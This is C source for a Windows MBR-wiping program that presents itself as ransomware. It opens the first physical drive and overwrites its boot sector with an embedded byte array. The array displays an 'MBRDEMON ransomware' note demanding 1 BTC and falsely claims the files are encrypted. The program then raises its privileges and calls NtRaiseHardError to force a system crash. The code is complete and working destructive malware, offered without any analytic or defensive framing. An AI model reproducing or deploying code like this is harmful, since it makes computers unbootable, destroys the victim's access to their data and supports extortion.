#include <windows.h>
//importing ntdll
#pragma comment(lib, "ntdll.lib")

#pragma comment(lib, "kernel32.lib")// - add this string if you compiling on mingw32

const unsigned char MasterBootRecord[] = {0xEB, 0x00, 0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBE, 0x24, 0x7C, 0xB3, 
0x09, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xB7, 0x00, 0xAC, 0x3C, 0x00, 0x74, 0x06, 0xB4, 0x0E, 0xCD, 
0x10, 0xEB, 0xF5, 0xC3, 0x59, 0x6F, 0x75, 0x20, 0x62, 0x65, 0x63, 0x61, 0x6D, 0x65, 0x20, 0x61, 
0x20, 0x76, 0x69, 0x63, 0x74, 0x69, 0x6D, 0x20, 0x6F, 0x66, 0x20, 0x74, 0x68, 0x65, 0x20, 0x4D, 
0x42, 0x52, 0x44, 0x45, 0x4D, 0x4F, 0x4E, 0x20, 0x72, 0x61, 0x6E, 0x73, 0x6F, 0x6D, 0x77, 0x61, 
0x72, 0x65, 0x21, 0x0D, 0x0A, 0x41, 0x6C, 0x6C, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x66, 0x69, 
0x6C, 0x65, 0x73, 0x20, 0x61, 0x72, 0x65, 0x20, 0x65, 0x6E, 0x63, 0x72, 0x79, 0x70, 0x74, 0x65, 
0x64, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x61, 0x20, 0x73, 0x70, 0x65, 0x63, 0x69, 0x61, 0x6C, 
0x20, 0x61, 0x6C, 0x67, 0x6F, 0x72, 0x69, 0x74, 0x68, 0x6D, 0x20, 0x61, 0x6E, 0x64, 0x20, 0x79, 
0x6F, 0x75, 0x72, 0x20, 0x6D, 0x62, 0x72, 0x20, 0x69, 0x73, 0x20, 0x6C, 0x6F, 0x63, 0x6B, 0x65, 
0x64, 0x2E, 0x0D, 0x0A, 0x4F, 0x6E, 0x6C, 0x79, 0x20, 0x77, 0x61, 0x79, 0x20, 0x74, 0x6F, 0x20, 
0x67, 0x65, 0x74, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x64, 0x61, 0x74, 0x61, 0x20, 0x62, 0x61, 
0x63, 0x6B, 0x20, 0x69, 0x73, 0x20, 0x74, 0x6F, 0x20, 0x70, 0x61, 0x79, 0x20, 0x6D, 0x65, 0x20, 
0x61, 0x20, 0x70, 0x72, 0x69, 0x63, 0x65, 0x20, 0x6F, 0x66, 0x20, 0x31, 0x20, 0x42, 0x54, 0x43, 
0x0D, 0x0A, 0x41, 0x6C, 0x6C, 0x20, 0x6F, 0x74, 0x68, 0x65, 0x72, 0x20, 0x61, 0x74, 0x74, 0x65, 
0x6D, 0x70, 0x74, 0x73, 0x20, 0x74, 0x6F, 0x20, 0x72, 0x65, 0x73, 0x74, 0x6F, 0x72, 0x65, 0x20, 
0x64, 0x61, 0x74, 0x61, 0x20, 0x77, 0x69, 0x6C, 0x6C, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x0D, 0x0A, 
0x52, 0x65, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x69, 0x6E, 0x67, 0x20, 0x57, 0x69, 0x6E, 
0x64, 0x6F, 0x77, 0x73, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x62, 0x6C, 
0x6F, 0x63, 0x6B, 0x65, 0x64, 0x0D, 0x0A, 0x45, 0x6E, 0x74, 0x65, 0x72, 0x20, 0x64, 0x65, 0x63, 
0x72, 0x79, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x6B, 0x65, 0x79, 0x3A, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
//externing rtladjustprivilege
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
//externing ntraiseharderror
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);

int CALLBACK WinMain(
    HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine, int       nCmdShow
)
{
    // just open a handle to PhysicalDrive0, and we write our custom bootloader
    // https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);

    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0); // write the file to the handle
    CloseHandle(hDevice); // close the handle
    	//boolean
	BOOLEAN b;

	//bsod response
	unsigned long response;

	//process privilege
	RtlAdjustPrivilege(19, true, false, &b);

	//call bsod
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);		
}
